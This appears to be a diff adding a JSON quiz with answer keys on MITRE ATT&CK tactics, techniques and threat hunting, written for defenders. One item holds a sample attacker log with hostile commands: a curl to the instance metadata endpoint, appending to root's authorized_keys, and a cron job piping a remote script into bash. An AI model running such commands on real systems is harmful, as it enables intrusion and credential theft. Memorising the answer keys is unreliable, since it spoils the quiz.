@@ -1,0 +1,77 @@
+[
+  {
+    "q": "In ATT&CK terminology, what answers the question 'WHY' an attacker does something?",
+    "options": ["Technique", "Tactic", "Procedure", "Mitigation"],
+    "answer": 1,
+    "explain": "The tactic is the goal (e.g. Persistence), the technique is the method (e.g. Cron), and the procedure is the specific implementation used by a particular group."
+  },
+  {
+    "q": "How many tactics does the Enterprise matrix have in ATT&CK v19?",
+    "options": ["12", "14", "15", "18"],
+    "answer": 2,
+    "explain": "In v19 (April 2026) Defense Evasion was split into Stealth and Defense Impairment, so the number of tactics grew from 14 to 15."
+  },
+  {
+    "q": "An attacker stops the EDR agent and deletes logs from the server. Which v19 tactic describes this best?",
+    "options": ["Stealth (TA0005)", "Defense Impairment (TA0112)", "Discovery (TA0007)", "Impact (TA0040)"],
+    "answer": 1,
+    "explain": "Defense Impairment describes actively disabling security mechanisms and tools so defenders can't see or can't trust what they see. Stealth is hiding activity so it looks normal."
+  },
+  {
+    "q": "Malware names its process 'kworker/0:1' to look like a kernel thread. Which tactic?",
+    "options": ["Stealth", "Defense Impairment", "Credential Access", "Execution"],
+    "answer": 0,
+    "explain": "Masquerading hides activity so it looks legitimate. Nothing is disabled, so it isn't Defense Impairment."
+  },
+  {
+    "q": "What does the ID T1053.003 mean?",
+    "options": ["Tactic 1053, version 3", "Sub-technique 003 (Cron) of technique T1053 (Scheduled Task/Job)", "The third group using T1053", "A CVE related to cron"],
+    "answer": 1,
+    "explain": "T denotes a technique, and the .003 suffix a sub-technique. TA are tactics, G groups, S software, M mitigations."
+  },
+  {
+    "q": "According to the Pyramid of Pain, blocking what causes the attacker the MOST trouble?",
+    "options": ["Malware hash values", "C2 server IP addresses", "Domain names", "TTPs (behavior)"],
+    "answer": 3,
+    "explain": "A hash changes with one byte, and IPs and domains are cheap. Changing behavior requires new tools, training and ways of operating."
+  },
+  {
+    "q": "Which artifacts do you look for when hunting persistence on a Linux server? (multiple answers)",
+    "options": ["New lines in /etc/cron.d and crontabs", "Unknown keys in authorized_keys", "Accounts with UID 0 other than root", "The size of the /tmp partition"],
+    "answer": [0, 1, 2],
+    "explain": "Cron (T1053.003), SSH keys (T1098.004) and additional root accounts (T1136.001) are classic Linux persistence mechanisms. Partition size is not an indicator."
+  },
+  {
+    "q": "What is the ATT&CK Navigator used for?",
+    "options": ["Vulnerability scanning", "Visualizing and coloring techniques, e.g. showing detection coverage or a group's techniques", "Writing Sigma rules", "Launching attacks"],
+    "answer": 1,
+    "explain": "The Navigator creates layers over the matrix, making it easy to see detection gaps or which techniques a particular group uses."
+  },
+  {
+    "q": "What is Atomic Red Team?",
+    "options": ["MITRE's list of APT groups", "A library of small tests per ATT&CK technique for checking whether detections work", "A commercial SIEM", "A vulnerability scoring standard"],
+    "answer": 1,
+    "explain": "Atomic tests (Red Canary) emulate one technique each, so the SOC can see whether the corresponding alert actually fires."
+  },
+  {
+    "q": "An application on an EC2 instance makes calls to 169.254.169.254 and retrieves IAM role credentials, which it normally doesn't do. Which technique?",
+    "options": ["T1552.005 Cloud Instance Metadata API (Credential Access)", "T1496 Resource Hijacking", "T1053.003 Cron", "T1190 Exploit Public-Facing Application"],
+    "answer": 0,
+    "explain": "The metadata service issues temporary credentials for the instance role. Attackers often reach it via SSRF. Defense: IMDSv2 and minimal role permissions."
+  },
+  {
+    "q": "Why does ATT&CK have an advantage over the Cyber Kill Chain for writing detections?",
+    "options": ["The Kill Chain is secret", "ATT&CK is more detailed and covers behavior after the intrusion, where most detection work happens", "The Kill Chain doesn't exist for Linux", "ATT&CK automatically blocks attacks"],
+    "answer": 1,
+    "explain": "The Kill Chain is a good communication framework, but the 'Actions on Objectives' phase is too broad. ATT&CK breaks it down into hundreds of specific techniques."
+  },
+  {
+    "type": "multi",
+    "q": "Based on this log, which ATT&CK PERSISTENCE techniques did the attacker use? (multiple answers)",
+    "lang": "log",
+    "snippet": "Oct 28 02:13:55 web01 sshd[4098]: Failed password for deploy from 203.0.113.45 port 51090 ssh2\nOct 28 02:14:07 web01 sshd[4121]: Accepted password for deploy from 203.0.113.45 port 51122 ssh2\nOct 28 02:15:31 web01 sudo: deploy : USER=root ; COMMAND=/usr/bin/curl -s http://169.254.169.254/latest/\nOct 28 02:16:02 web01 sudo: deploy : USER=root ; COMMAND=/usr/bin/tee -a /root/.ssh/authorized_keys\nOct 28 02:16:40 web01 sudo: deploy : USER=root ; COMMAND=/usr/bin/crontab -u root /tmp/.c\nOct 28 02:16:41 web01 crontab[4377]: (root) REPLACE (root)\nOct 28 02:18:01 web01 CRON[4410]: (root) CMD (curl -s http://198.51.100.7/x.sh | bash)",
+    "options": ["T1098.004 SSH Authorized Keys", "T1053.003 Cron", "T1552.005 Cloud Instance Metadata API", "T1136.001 Local Account", "T1543.002 Systemd Service"],
+    "answer": [0, 1],
+    "explain": "tee -a /root/.ssh/authorized_keys appends the attacker's key (T1098.004), and crontab -u root together with the CRON line that downloads and runs a script every minute is T1053.003. The call to 169.254.169.254 is T1552.005, but that belongs to the Credential Access tactic, not persistence. The log shows no new user and no systemd unit. Initial access was T1078 Valid Accounts (password login to the deploy account)."
+  }
+]
